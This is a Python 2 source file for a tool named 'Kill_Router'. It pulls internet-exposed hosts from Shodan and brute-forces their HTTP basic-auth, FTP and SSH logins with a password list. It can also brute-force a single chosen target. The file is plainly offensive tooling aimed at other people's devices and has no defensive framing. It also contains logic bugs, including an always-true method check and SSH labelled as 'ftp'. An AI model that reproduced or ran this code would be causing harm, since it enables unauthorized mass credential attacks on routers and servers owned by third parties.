#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys

from ftp import FTP
from ssh import SSH
from basic_auth import Basic_Auth
from passlists import Passlist
from shodan_search import Shodan_Search

class Kill_Router(object):

    def __init__(self):
        pass

    def shodan_search(self, args):

        shodan = Shodan_Search()

        if shodan.validateapi():
            results = shodan.search(args.shodan)
            response = raw_input('YOU WANT TO TEST SHODAN RESULTS? Y/N: ').upper().strip()

            if response == "Y":

                parser = Passlist(args.passlist)
                passwords = parser.get_list()

                for result in results['matches']:

                    try:

                        method = "http"
                        Attack = Basic_Auth()

                        if result['port'] == 21:
                            method = "ftp"
                            Attack = FTP()

                        if result['port'] == 22:
                            method = "ftp"
                            Attack = SSH()

                        if result['port'] == 443:
                            method = "https"
                            Attack = Basic_Auth()

                        print method

                        Attack.brute_force(result['ip_str'], result['port'], args.username, passwords, method)

                    except:
                        pass


            else:
                sys.exit()

        else:
            sys.exit()

    def bruteforce(self,target,port,method,passlist,username):

        parser = Passlist(passlist)
        passwords = parser.get_list()

        if method == "http" or "https":
            attack = Basic_Auth()

        if method == "ssh":
            attack = SSH()

        if method == "ftp":
            attack = FTP()


        attack.brute_force(target, port, username, passwords, method)






